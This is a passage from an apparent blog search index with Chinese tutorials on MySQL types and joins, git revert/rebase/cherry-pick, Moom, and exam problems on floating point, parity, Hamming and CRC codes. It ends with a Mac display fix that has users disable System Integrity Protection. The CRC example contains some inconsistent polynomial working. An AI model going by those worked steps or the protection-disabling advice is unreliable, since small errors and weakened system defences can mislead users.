[ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[REAL[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nM是总位数，D是小数点后的位数。如果省略M和D，则值存储在硬件允许的范围内。双精度浮点数精确到小数点后15位左右。DOUBLE（M，D）是一个非标准的MySQL扩展。从MySQL 8.0.17开始，不推荐使用这种语法，在将来的MySQL版本中将删除对它的支持。\n\n\n\n+ 第四类\n\n[FLOAT(**p**) [UNSIGNED\\] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\n如果p从0到24，数据类型变为FLOAT，没有M或D值。如果p从25到53，数据类型变为DOUBLE，没有M或D值。\n\n\n\n### 1.3 总结\n\n+ 浮点数不推荐使用 FLOAT 和 DOUBLE\n+ 浮点数推荐使用DECIMAL, 不推荐使用无符号\n\n\n\n# 2. int(11)  括号的数字\n\n对于整数数据类型，M表示最大显示宽度。最大显示宽度为255。显示宽度与类型可以存储的值范围无关。\n\n### 2.1 int(1)、tinyint(4) 哪个大?\n\nint 大。\n\n注意数字类型后面括号中的数字，不表示长度，表示的是显示宽度，这点与 varchar、char 后面的数字含义是不同的。\n\n也就是说不管 int 后面的数字是多少，它存储的范围始终是 -2^31 到 2^31 - 1，但是int(1)只显示个位数。\n\n综上整型的数据类型括号内的数字不管是多少，所占的存储空间都是一样。\n\n\n\n# 3. char(4) 和 varchar(4) 括号的数字\n\nCHAR和VARCHAR类型声明的长度指示要存储的最大字符数。\n\n例如，CHAR（30）最多可容纳30个字符。如果是utf8mb4格式, 最多可容纳30个字符或汉字。\n\n### 3.1 长度限制\n\nCHAR列的长度固定为创建表时声明的长度。长度可以是0到255之间的任何值。\n\nVARCHAR列中的值是可变长度的字符串。长度可以指定为0到65535之间的值。VARCHAR的有效最大长度取决于最大行大小和使用的字符集。\n\n### 3.2 填空和截断\n\n当存储CHAR值时，将使用指定长度的空格对其进行右填充。\n\nVARCHAR值在存储时不填充。在存储和检索值时，尾部空格将被保留，这与标准SQL一致。\n\n\n\n如果未启用strict SQL模式，并且将值分配给超过该列最大长度的CHAR或VARCHAR列，则会截断该值以适合该列，并生成警告。\n\n对于非空格字符的截断，可以使用strict SQL模式导致发生错误（而不是警告）并禁止插入值。\n\n### 3.3 示例\n\n下表通过显示将各种字符串值存储到CHAR（4）和VARCHAR（4）列中的结果（假设列使用单字节字符集，如latin1），说明了CHAR和VARCHAR之间的区别。\n\n| Value      | CHAR(4) | Storage Required | VARCHAR(4) | Storage Required |\n| ---------- | ------- | ---------------- | ---------- | ---------------- |\n| ''         | '  '    | 4 bytes          | ''         | 1 byte           |\n| 'ab'       | 'ab '   | 4 bytes          | 'ab'       | 3 bytes          |\n| 'abcd'     | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n| 'abcdefgh' | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n\n\n\n# 10. 参考资料\n\n+ https://dev.mysql.com/doc/refman/8.0/en/numeric-type-syntax.html\n+ https://dev.mysql.com/doc/refman/8.0/en/char.html\n+ https://stackoverflow.com/a/3003533\n+ https://dev.mysql.com/doc/refman/8.0/en/index-condition-pushdown-optimization.html","tags":["mysql"],"categories":["mysql"]},{"title":"mysql的join介绍","url":"%2Fp%2F289dcf0b.html","content":"\n\n\n# 1.  join类型\n\n在关系代数中，连接运算是由一个笛卡尔积运算和一个选取运算构成的。首先用笛卡尔积完成对两个数据集合的乘运算，然后对生成的结果集合进行选取运算，确保只把分别来自两个数据集合并且具有重叠部分的行合并在一起。\n\n连接的全部意义在于在水平方向上合并两个数据集合（通常是表），并产生一个新的结果集合，其方法是将一个数据源中的行于另一个数据源中和它匹配的行组合成一个新元组。\n\nSQL提供了多种类型的连接方式，它们之间的区别在于：从相互交叠的不同数据集合中选择用于连接的行时所采用的方法不同。\n\n<!-- more -->\n\n### 1.1  join分类\n\n| 连接类型   | 连接种类         | 定义                                                         |\n| ---------- | ---------------- | ------------------------------------------------------------ |\n| Inner Join | Inner Join       | 内连接是最常见的一种连接，它也被称为普通连接，只连接匹配的行（仅对满足连接条件的CROSS中的列）。它又分为等值连接（连接条件运算符为\"=\"）和不等值连接（连接条件运算符不为\"=\"，例如between...and）。 |\n| Outer Join | Full Outer Join  | FULL JOIN 会从左表 和右表 那里返回所有的行。如果其中一个表的数据行在另一个表中没有匹配的行，那么对面的数据用NULL代替。 |\n| Outer Join | Left Outer Join  | LEFT JOIN返回左表的全部行和右表满足ON条件的行，如果左表的行在右表中没有匹配，那么这一行右表中对应数据用NULL代替。 |\n| Outer Join | Right Outer Join | RIGHT JOIN返回右表的全部行和左表满足ON条件的行，如果右表的行在左表中没有匹配，那么这一行左表中对应数据用NULL代替。 |\n| Cross Join | Cross Join       | CROSS对两个表执行笛卡尔乘积。它为左表行和右表行的每种可能的组合返回一行。返回（左表行数*右表行数）行的表。 |\n| 其他       | 自然连接         | 自然连接是一种特殊的等值连接,在连接条件中使用等于(=)运算符比较被连接列的列值，但它使用选择列表指出查询结果集合中所包括的列，并删除连接表中的重复列。 |\n| 其他       | 自连接           | 某个表和其自身连接，常用在同一表内不同数据间对同一列的比较   |\n\n\n\n### 1.2 常见分类\n\nThere are 4 different types of Oracle joins:\n\n- Oracle INNER JOIN (or sometimes called simple join)\n- Oracle LEFT OUTER JOIN (or sometimes called LEFT JOIN)\n- Oracle RIGHT OUTER JOIN (or sometimes called RIGHT JOIN)\n- Oracle FULL OUTER JOIN (or sometimes called FULL JOIN)\n\n\n\n# 2. join使用\n\n**Examples**\n\n```sql\nA    B\n-    -\n1    3\n2    4\n3    5\n4    6\n```\n\n**Inner join**\n\n```sql\nselect * from a INNER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b;\n\na | b\n--+--\n3 | 3\n4 | 4\n```\n\n**Left outer join**\n\n```sql\nselect * from a LEFT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b(+);\n\na |  b\n--+-----\n1 | null\n2 | null\n3 |    3\n4 |    4\n```\n\n**Right outer join**\n\n```sql\nselect * from a RIGHT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a(+) = b.b;\n\na    |  b\n-----+----\n3    |  3\n4    |  4\nnull |  5\nnull |  6\n```\n\n\n\n**Full outer join**\n\n```sql\nselect * from a FULL OUTER JOIN b on a.a = b.b;\n\n a   |  b\n-----+-----\n   1 | null\n   2 | null\n   3 |    3\n   4 |    4\nnull |    6\nnull |    5\n```\n\n\n\n# 3. join区别\n\n### 3.1 inner join, outer join\n\n- An inner join of A and B gives the result of A intersect B\n- An outer join of A and B gives the results of A union B\n\n![1](mysql的join介绍/1.png)\n\n\n\n\n\n### 3.2 inner join 和 多表连查 一致\n\n```sql\nSELECT * FROM\ntable a INNER JOIN table b\nON a.id = b.id;\n```\n\nvs\n\n```sql\nSELECT a.*, b.*\nFROM table a, table b\nWHERE a.id = b.id;\n```\n\n多表连查, 带 where 条件的一般又称为隐式内连接,  在性能方面，它们是完全相同的。\n\n\n\n### 3.3  left join 和 多表连查 区别\n\n实际项目中, 最常用的两种方式.\n\n+  left join 就是 left outer join, 一般会产生 null\n+ 多表查询加 where, 可以理解为 inner join\n\n\n\n### 3.4 on, where 的区别\n\n+ 对于inner joins, 无关紧要\n\n+ 对于 outer joins, 先 on 后 where\n\n  + `ON` clause - **Before** joining.    在join之前将被过滤,  有些结果可能为null（因为outer join）。\n\n  + `WHERE` clause: **After** joining.   在join之后过滤记录, **一般可以过滤掉 null**。\n\n    \n\n“A LEFT JOIN B ON 条件表达式” 中的ON用来决定如何从 B 表中检索数据行。如果 B 表中没有任何一行数据匹配 ON 的条件,将会额外生成一行所有列为 NULL 的数据。仅在匹配阶段完成以后，WHERE 子句条件才会被使用。它将从匹配阶段产生的数据中检索过滤。\n\n\n\n所以我们要注意：在使用Left (right) join的时候，一定要在先给出尽可能多的匹配满足条件，减少Where的执行。如：\n\n```sql\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name\nleft join D on D.id = C.id\nwhere C.status>1 and D.status=1;\n\n--可以优化成:\n\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name and C.status>1\nleft join D on D.id = C.id and D.status=1\n```\n\n\n\n**Example**\n\n```sql\n    1. documents:\n     | id    | name        |\n     --------|-------------|\n     | 1     | Document1   |\n     | 2     | Document2   |\n     | 3     | Document3   |\n     | 4     | Document4   |\n     | 5     | Document5   |\n\n\n    2. downloads:\n     | id   | document_id   | username |\n     |------|---------------|----------|\n     | 1    | 1             | sandeep  |\n     | 2    | 1             | simi     |\n     | 3    | 2             | sandeep  |\n     | 4    | 2             | reya     |\n     | 5    | 3             | simi     |\n```\n\n\n\n**ON**\n\n```sql\nSELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\nON documents.id = downloads.document_id\nAND username = 'sandeep'\n\n中间表:\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 3                  | Document3    | NULL                | NULL        | NULL     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\n注意“ documents”中不符合这两个条件的行是如何用“ NULL”值填充的。\n\n最终:\n   | name       | id   |\n   |------------|------|\n   |  Document1 | 1    |\n   |  Document2 | 3    | \n   |  Document3 | NULL |\n   |  Document4 | NULL | \n   |  Document5 | NULL | \n```\n\n\n\n**WHERE**\n\n```sql\n SELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\n ON documents.id = downloads.document_id\n WHERE username = 'sandeep'\n\n 先 on 产生中间表:\n\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 1                  | Document1    | 2                   | 1           | simi     |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 2                  | Document2    | 4                   | 2           | reya     |\n    | 3                  | Document3    | 5                   | 3           | simi     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\n最终结果:\n\n   | name         | id |\n   |--------------|----|\n   | Document1    | 1  |\n   | Document2    | 3  | \n```\n\n\n\n### 3.5 mysql 实现 full join(全外连接)\n\n mysql  默认不支持 full join, 但是可以用下面实现\n\n```sql\nSELECT * FROM t1\nLEFT JOIN t2 ON t1.id = t2.id\nUNION\nSELECT * FROM t1\nRIGHT JOIN t2 ON t1.id = t2.id\n```\n\n\n\n# 4. cross join 真正笛卡尔乘积查询\n\n### 4.1 cross join , inner join\n\n交叉联接不会合并行，如果每个表中有100行且一一匹配，则会得到10000个结果，在相同情况下，Innerjoin将仅返回100行。\n\n这两个示例将返回相同的结果：\n\nCross join\n\n```sql\nselect * from table1 cross join table2 where table1.id = table2.fk_id\n```\n\nInner join\n\n```sql\nselect * from table1 join table2 on table1.id = table2.fk_id\n```\n\nUse the last method\n\n\n\n### 4.2 cross join, full outer join区别\n\n+  cross join\n\n  交叉联接会在两个表之间产生笛卡尔乘积，并返回所有行的所有可能组合。 它没有on子句，因为您只是将所有内容连接到所有内容。\n\n  使用空表（或结果集）的交叉联接会导致空表（M x N；因此M x 0 = 0)\n\n+ full outer join\n\n  完全外部联接是左外部联接和右外部联接的组合。 它返回两个表中与查询的where子句匹配的所有行，并且在无法满足这些行的打开条件的情况下，它将为未填充的字段放入空值。\n\n  完全外部联接将始终具有行，除非M和N均为0。\n\n\n\n### 4.3 mysql 中cross join\n\n在Mysql中,cross join ,inner join和 join所实现的功能是一样的。因此在MYSQL的官方文档中，指明了三者是等价的关系。\n\nhttps://dev.mysql.com/doc/refman/5.7/en/join.html\n\nIn MySQL, JOIN, CROSS JOIN, and INNER JOIN are syntactic equivalents (they can replace each other). In standard SQL, they are not equivalent. INNER JOIN is used with an ON clause, CROSS JOIN is used otherwise.\n\n\n\n# 5. 头脑风暴\n\n### 5.1 等价行为\n\n+  LEFT JOIN and LEFT OUTER JOIN 完全一样,  RIGHT JOIN and RIGHT OUTER JOIN 完全一样\n+  JOIN 默认情况下是 INNER JOIN, MySQL中,cross join ,inner join和 join所实现的功能是一样的。\n\n### 5.2 查询顺序\n\n+  对于INNER JOIN，顺序无关紧要, 对于（LEFT，RIGHT或FULL）OUTER JOIN，顺序很重要\n\n### 5.3 性能\n\n+ INNER JOIN 和 LEFT JOIN 的性能\n\n  1. 如果它们返回相同的结果，则它们的速度相同。但是，我们必须记住它们不是相同的查询，并且LEFT JOIN可能会返回更多的结果（当某些ON条件不满足时）--这就是为什么它通常比较慢的原因。\n\n  2. 当主表（执行计划中的第一个表）具有限制条件（其中id=？）而相应的ON条件为空值，则“right”表未联接——此时LEFT联接速度更快。\n\n  3. 如第1点所讨论的，通常INNER JOIN限制更严格，返回的结果更少，因此速度更快。\n\n  \n\n# 6. 参考资料\n\n+ https://blog.csdn.net/u012861978/article/details/52203818\n+ https://stackoverflow.com/a/38578\n+ https://stackoverflow.com/a/17759769\n+ https://stackoverflow.com/questions/3228871\n+ https://stackoverflow.com/questions/44917\n+ https://stackoverflow.com/a/28719292\n+ https://stackoverflow.com/a/20981676\n+ https://stackoverflow.com/a/4796911","tags":["sql"],"categories":["mysql"]},{"title":"git魔法操作","url":"%2Fp%2F92ab0521.html","content":"\n# 1. revert\n\nrevert以新增一个 commit 的方式还原某一个 commit 的修改。这是一个安全的方法，因为它不会重写提交历史。\n\n```bash\ngit revert <commit-id>\n```\n\n<!-- more -->\n\n```bash\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n# 撤销上一次提交\ngit revert d38ece4\n\n\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n\n# 我再撤上一次撤回的提交\ngit revert edaa22e\n\n* 71903f8 - (HEAD -> cherry) Revert \"Revert \"add 1\"\" (50 seconds ago) <liuwei>\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n```\n\n\n\n如果为了commit干净, 可以使用`reset --hard +  push -f `(除非你知道你在干什么)\n\n\n\n# 2. rebase\n\n合并分支时候, merge 更安全, 保留的信息更多,  但是树结构会交错。rebase 会保证整个提交树特别整齐。\n\n在你运行 git rebase 之前，一定要问问你自己「有没有别人正在这个分支上工作？」。如果答案是肯定的，那么把你的爪子放回去。\n\n### 2.1  rebase介绍\n\nrebase 算是git的一个黑魔法, 如果不会rebase, 别说会用git。\n\n移步:  https://www.liuvv.com/p/b1718ace.html\n\n\n\n### 2.2 git pull --rebase\n\n当你在本地端的master分支开发时，你commit了一个小改变。同时其他人将他本周的修改推上了远地master分支。当你试着推上你的commit时，git会要求你先做git pull的动作。\n\n当你下了git pull时，git会帮你产生一个`Merge remtoe-tracking branch ‘origin/master’` 的 commit。\n\n虽然这没什么大不了的，但是这让log看起来有点混乱了。这个例子可以使用`git pull --rebase`。\n\n这会先强制git抓取(pull)远地的修改，然后再重新接上(re-apply[rebase])你尚未推到远地端的commit，并且推上你的commit。这样一来git自动产生的Merge remote-tracking的log就不会出现了。\n\n\n\n# 3. 其他\n\n### 3.1 实用操作\n\n移步:  https://www.liuvv.com/p/42eae4e7.html\n\n### 3.2 cherry-pick\n\n移步:  https://www.liuvv.com/p/6aa4bbd5.html\n\n### 3.3 blame\n\n查看某段代码是谁写的, blame 的意思为‘责怪’，你懂的。\n\n```bash\ngit blame <file-name>\n```\n\n### 3.4 reflog(救命大招)\n\n当骚操作出现问题的时候, 例如 reset, merge, rebase 中断了,  如果你找不到commit hash, 会不会奔溃?\n\n每次更新了 HEAD 的 git 命令比如 commint、amend、cherry-pick、reset、revert 等都会被记录下来（不限分支），就像 shell 的 history 一样。 可以通过reflog查看。 \n\n```bash\ngit reflog\n```\n\n### 3.5 查看分支文件\n\n```bash\ngit show master:go.mod\n```\n\n\n\n# 4. 参考资料\n\n\n+ https://github.com/521xueweihan/git-tips\n+ https://github.com/geeeeeeeeek/git-recipes","tags":["git"],"categories":["git"]},{"title":"git的cherry-pick的使用","url":"%2Fp%2F6aa4bbd5.html","content":"\n对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。\n\n一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge 或 git rebase）。\n\n另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用(git cherry-pick) 。\n\n<!-- more -->\n\n# 1. cherry-pick使用\n\n### 1.1 hash方式\n\ngit cherry-pick命令的作用，就是将指定的提交（commit）应用于其他分支。\n\n```bash\n$ git cherry-pick <commitHash>\n```\n\n上面命令就会将指定的提交commitHash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。\n\n\n\n+ A分支log:\n\n```ini\n* cf976d8 - (HEAD -> master, origin/master, origin/HEAD) add 2 (2 minutes ago) <liuwei>\n* 07444e6 - add 1 (2 minutes ago) <liuwei>\n* 73a2b7f - (cherry) rm citycode (4 minutes ago) <liuwei>\n```\n\n+ B分支操作\n\n```bash\ngit cherry-pick 07444e6\n```\n\n+ 然后再看B分支log:\n\n```ini\n* d38ece4 - (HEAD -> cherry) add 1 (11 seconds ago) <liuwei>\n* 73a2b7f - rm citycode (5 minutes ago) <liuwei>\n```\n\n\n\n### 1.2 分支方式\n\ngit cherry-pick命令的参数，不一定是提交的哈希值，分支名也是可以的，表示转移该分支的最新提交。\n\n```bash\n$ git cherry-pick feature\n```\n\n上面代码表示将feature分支的最近一次提交，转移到当前分支。!!!注意是一次提交(commit), 不是所有的提交。!!!\n\n\n\n### 1.3 多个提交\n\nCherry pick 支持一次转移多个提交。\n\n```bash\n$ git cherry-pick <HashA> <HashB>\n```\n\n上面的命令将 A 和 B 两个提交应用到当前分支。这会在当前分支生成两个对应的新提交。\n\n\n\n如果想要转移一系列的连续提交，可以使用下面的简便语法。\n\n```bash\n$ git cherry-pick A..B \n```\n\n上面的命令可以转移从 A 到 B 的所有提交。它们必须按照正确的顺序放置：提交 A 必须早于提交 B，否则命令将失败，但不会报错。\n\n注意，使用上面的命令，提交 A 将不会包含在 Cherry pick 中。\n\n\n\n# 2. 代码冲突\n\n如果操作过程中发生代码冲突，Cherry pick 会停下来，让用户决定如何继续操作。\n（1）--continue\n用户解决代码冲突后，第一步将修改的文件重新加入暂存区（git add .），第二步使用下面的命令，让 Cherry pick 过程继续执行。\n\n```bash\n$ git cherry-pick --continue\n```\n\n（2）--abort\n\n发生代码冲突后，放弃合并，回到操作前的样子。\n\n```bash\n$ git cherry-pick --abort\n```\n\n（3）--quit\n发生代码冲突后，退出 Cherry pick，但是不回到操作前的样子。\n\n```bash\n$ git cherry-pick --quit\n```\n\n\n\n# 3. 停止使用cherry-pick\n\n在开发中，不要使用 cherry-pick 来进行不同分支之间代码的同步，这很可能会造成最终合并时出现冲突，而且可能产生比冲突更严重的问题：该有冲突却没有冲突。\n\n\n\n![1](git的cherry-pick的使用/1.png)\n\n\n\n如上图，`apple` 代表这个功能是上线状态，`berry` 代表这个功能是下线状态。\n\n然后我们发现了一些 bug，需要将该功能紧急下线，我们：\n\n- 在 feature 分支上下线该功能（F2）：`apple -> berry`\n- 然后将该操作 cherry-pick 到 master（M2），现在 master 上该功能也下线了\n- 然后我们在 feature 分支上进行了 bug 修复，最终解决了 bug，我们在 feature 分支上将该功能上线（F3）：`berry -> apple`\n- 然后我们决定将 bug 修复 merge 到 master\n- merge 顺利完成，没有冲突。**但是：这行代码仍然是`berry`，下线状态**\n\nmerge 分析：M3(`berry`) 和 F3(`apple`) 的最近公共祖先是 A(`apple`)，因此 git 认为 feature 分支并未修改 `apple` 的值，结果合并后 master 分支上这行代码还是 `berry`，我们的功能在 master 上还是下线状态。\n\n\n\n### 3.1 经验\n\n如果你的两个分支是两个单独的分支，永远不会相互 merge，那么才使用 cherry-pick。\n\n\n\n# 4. 参考资料\n\n\n+ https://www.ruanyifeng.com/blog/2020/04/git-cherry-pick.html\n+ https://imliyan.com/blogs/article/%E5%81%9C%E6%AD%A2%20cherry-pick%EF%BC%8C%E5%BC%80%E5%A7%8B%20merge/\n","tags":["git"],"categories":["git"]},{"title":"moom窗口移动和控制","url":"%2Fp%2Facfaa308.html","content":"\nmac配置了多个外接显示器，有些窗口需要快速移动到某个显示器内。另外如何应对个别用户需要定制窗口尺寸及位置的需求？这个时候你需要Moom来辅助你。\n\n <!-- more -->\n\n# 1. moom\n\n### 1.1 启动在menu bar上\n<img src=\"moom窗口移动和控制/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n### 1.2 唤起控制\n\noption+2， 然后command+箭头可以快速调整。\n\n<img src=\"moom窗口移动和控制/image-20220108171859040.png\" alt=\"image-20220108171859040\" style=\"zoom:50%;\" />\n\n### 1.3 移动其他显示屏\n\n自定义快捷键， 移动到其他显示器上（上下左右方向） 。\n\n<img src=\"moom窗口移动和控制/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.4 保存当前布局\n\n我们可以把某些经常使用的窗口布局组合保存成 Moom 格式的布局快照，这样在任何时候都可以一键还原到最佳布局。\n\n<img src=\"moom窗口移动和控制/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n \n\n# 2. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/20258341\n","tags":["moom"],"categories":["使用"]},{"title":"计算机组成原理相关考题","url":"%2Fp%2F240de068.html","content":"\n\n\n# 1. 计算200.11D的 IEEE754单精度浮点数\n\n### 1.1 整数部分200求二进制\n\n|       | 结果 | 余数 |\n| ----- | ---- | ---- |\n| 200/2 | 100  | 0    |\n| 100/2 | 50   | 0    |\n| 50/2  | 25   | 0    |\n| 25/2  | 12   | 1    |\n| 12/2  | 6    | 0    |\n| 6/2   | 3    | 0    |\n| 3/2   | 1    | 1    |\n| 1/2   | 0    | 1    |\n\n二进制为: 1100 1000 (倒序)\n\n<!-- more -->\n\n### 1.2 小数部分0.11求二进制\n\n|        | 结果 | 整数部分 |\n| ------ | ---- | -------- |\n| 0.11*2 | 0.22 | 0        |\n| 0.22*2 | 0.44 | 0        |\n| 0.44*2 | 0.88 | 0        |\n| 0.88*2 | 1.76 | 1        |\n| 0.76*2 | 1.52 | 1        |\n| 0.52*2 | 1.04 | 1        |\n| 0.04*2 | 0.08 | 0        |\n| 0.08*2 | 0.16 | 0        |\n\n二进制为 0001 1100(正序)\n\n整个二进制为: 200.11D = 11001000.00011100\n\n### 1.3 求IEEE754\n\n+ 计算\n\n  ```bash\n  +200.11 = +11001000.00011100\n  \n  = +1.1001000 00011100 * 2^7    e=7=134-127\n  \n  S = 0(符号位)\n  E = 134D =10000110B (134的二进制)\n  M = 1001 0000 0011 1000 0000 000 (小数点1后面的,补齐23位)\n  ```\n\n+ 所以二进制存储格式为\n\n  | 符号位 | E(8位)    | M(23位)                      |\n  | ------ | --------- | ---------------------------- |\n  | 0      | 1000 0110 | 1001 0000 0011 1000 0000 000 |\n\n  ![1](计算机组成原理校验码考题/1.png)\n\n### 1.4 总结\n\n+ 单精度浮点数字长32位，尾数长度23，指数长度8, 指数偏移量127；\n\n+ https://www.binaryconvert.com/convert_float.html\n\n\n\n# 2. 计算10001101的奇校验码和偶校验码(校验位放在首位)\n\nP=D1⊕D2⊕D3⊕D4⊕D5⊕D6⊕D7⊕D8\n\nP* =P⊕D1⊕D2⊕D3⊕D4⊕D5⊕D6⊕D7⊕D8\n\n数据: 10001101 \n\n+ 奇校验码(1的个数为奇数)\n\n  1 10001101\n\n+ 偶校验码(1的个数为偶数)\n\n  0 10001101\n\n\n\n# 3. 计算数据 D=D4D3D2D1=1110的海明码(奇校验)\n\n### 3.1 计算\n\n2^r >= 4+1+r,   r = 3\n\n数据位为 D4D3D2D1\n\n校验位为 P3P2P1\n\n| 索引       | 7     | 6    | 5    | 4    | 3    | 2    | 1    |\n| ---------- | ----- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 信息位     | D4    | D3   | D2   | P3   | D1   | P2   | P1   |\n| 信息位值 | 1     | 1    | 1    | P3   | 0    | P2   | P1   |\n| 二进制 | 111 | 110 | 101 | (100) | 011 | (010) | (001) |\n\n\nP1 = D1⊕ D2 ⊕ D4 =  0 ⊕ 1 ⊕ 1 = 1(奇检验)\n\nP2 = D1⊕ D3 ⊕ D4 = 0 ⊕ 1 ⊕ 1 = 1(奇检验)\n\nP3 = D2⊕ D3 ⊕ D4 = 1 ⊕ 1 ⊕ 1 = 0(奇检验)\n\n所以奇校验的海明码为:  111 P3 0 P2 P1 =  1110 011\n\n### 3.2 总结\n\n+ 2^r ≥ k+r+1,  r 是校验位\n\n\n\n# 4. 计算信息多项式:101010110,生成多项式1100的CRC校验码\n\n1110 = 1* (x^3)  +  1 * ( x^2) +  1* (x^1) + 0 * (x^1)\n\n+ 先补充最高位次数,   101010 110 000\n+ 除数1100\n\n| 商:     |       |       |         | 1       | 1    | 0    | 0    | 1    | 1 | 0 | 1 | 1 | | |\n| ------- | ----- | ----- | ------- | ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------- | ------- |\n| 被除数: | 1     | 0     | 1       | 0       | 1    | 0    | 1    | 1    | 0    | 0    | 0    | 0    | | |\n|     | **1** | **1** | **0** | **0** |      |      |      |      |      |      |      |      | | |\n|     |       | 1     | 1       | 0       | 1    |      |      |      |      |      |      |      | | |\n|     |       | **1** | **1**   | **0**   | **0** |      |      |      |      |      |      |      | | |\n|     |       |       |         |         | 1    | 0    | 1    | 1    |      |      |      |      | | |\n|     |       |       |         |         | **1** | **1** | **0** | **0** |      |      |      |      | | |\n|     |       |       |         |         |      | 1 | 1 | 1 | 0 |      |      |      | | |\n|     |       |       |         |      |   | **1** | **1** | **0** | **0** |      |      |      | | |\n|     |       |       |         |         |      |      |      | 1 | 0 | 0 | 0 |      | | |\n|     |       |       |         |         |      |      |   | **1** | **1** | **0** | **0** |      | | |\n|     |       |       |         |         |      |      |      |      | 1 | 0 | 0 | 0 | | |\n|  | | | | | | | | | **1** | **1** | **0** | **0** | | |\n|  | | | | | | | | |  | 1 | 0 | 0 | | |\n|  | | | | | | | | |  |  |  |  | | |\n\n余数为100\n\n所以CRC校验码为: 101010110 100\n\n### 4.2 计算步骤\n\n1. 用最高位补齐被除数\n2. 拿出除数, 进行异或运算\n3. 商: 够除是1, 不够除是0\n4. 如果余数不足最高次数,  需要补齐0\n5. 把余数放在多项式后面即可\n\n\n\n# 5. 寻址方式\n\n+ 指令寻址方式\n\n+ 操作数寻址方式\n\n  + 立即寻址\n\n    指令中直接给出操作数，指令中的形式地址字段即为操作数，又称为立即数寻址。\n\n  + 隐含寻址\n\n    隐含寻址是指令字中不明确给出操作数的地址，其操作数隐含在操作码或某个寄存器中。\n\n  + 直接寻址\n\n      指令中地址码字段中给出的地址，即为操作数在主存中的地址，操作数在主存中。\n\n  + 间接寻址\n\n    指令中地址码字段中给出的地址，是操作数在主存中地址的地址，操作数在主存中。\n\n  + 寄存器直接寻址\n\n      指令中地址码给出的是寄存器的编号，操作数在指定的寄存器中。\n\n      由于操作数不在主存中,故这种寻址方式无需访存，减少了指令执行时间。由于地址字段只需指明寄存器编号,故位数较少，节省了存储空间。  因此，寄存器直接寻址方式得到广泛应用。\n\n  + 寄存器间接寻址\n\n    指令中地址码给出的是寄存器的编号，该寄存器中的内容为操作数地址，操作数在主存中。\n\n     这也是一种访内的寻址方式，与存储器间接寻址相比较，只需一次访内即可获得操作数，提高了执行速度，同样得到广泛应用。\n\n  + 相对寻址\n\n    相对寻址是把程序计数器PC的内容加上指令格式中的形式地址D(相对量)而形成操作数的有效地址。\n\n    相对寻址的最大特点是操作数地址与指令地址之间总是相差一个固定值，操作数地址随PC的变化而变化。因此，支持程序在主存中任意浮动。\n\n  + 变址寻址\n\n    变址寻址方式：是把变址寄存器BX的内容与偏移量D之和作为操作数有效地址。(有时通用寄存器也可作为变址器使用)\n\n    变址寄存器的内容是由程序员设定的，在程序执行过程中其内容可变，而指令字中的偏移量D是不可变的。 变址寻址主要用于数组处理。\n\n  + 基址寻址\n\n    基址寻址方式：是把变址寄存器BR的内容与偏移量D之和作为操作数有效地址。(有时通用寄存器也可作为变址器使用)\n\n    基址寻址可以扩大指令对主存的寻址范围。在多道程序和浮动程序编制时十分有用。\n\n  + 段寻址\n\n     段寻址是一种为了扩大寻址范围而采用的技术。\n\n    如采用将16位的段寄存器左移4位、加上16位的偏移量形成20位的物理地址，扩大了寻址空间。\n    \n  + 复合寻址方式：\n\n     是将两种基本寻址方式结合形成。\n\n\n\n# 6. 参考资料\n\n+ https://blog.csdn.net/crjmail/article/details/79723051\n+ https://zhuanlan.zhihu.com/p/26509678\n+ https://www.bilibili.com/video/BV1SJ41157pR\n+ https://www.bilibili.com/video/BV1xJ411K7Wx","tags":["校验码"],"categories":["计算机基础"]},{"title":"macbook外接显示器模糊问题","url":"%2Fp%2Fa6586325.html","content":"\n# 1. 解决方案\n\n### 1.0 禁止SIP前提\n\n`command + R` 进入mac安全模式, 禁止SIP\n\n```bash\ncsrutil disable\n```\n\n<!-- more -->\n\n### 1.1 TV 模式强制到 RGB mode\n\n+ 参考教程:\n\n  https://www.zhihu.com/question/19682094/answer/122193822\n\n  \n\n### 1.2 一键脚本开启HiDPI\n\nHiDPI本质上是用软件的方式实现单位面积内的高密度像素。用四个像素点来表现一个像素，因此能够更加清晰细腻。\n\n**高PPI(硬件) + HiDPI渲染(软件) = 更细腻的显示效果(retina)**\n\n+ 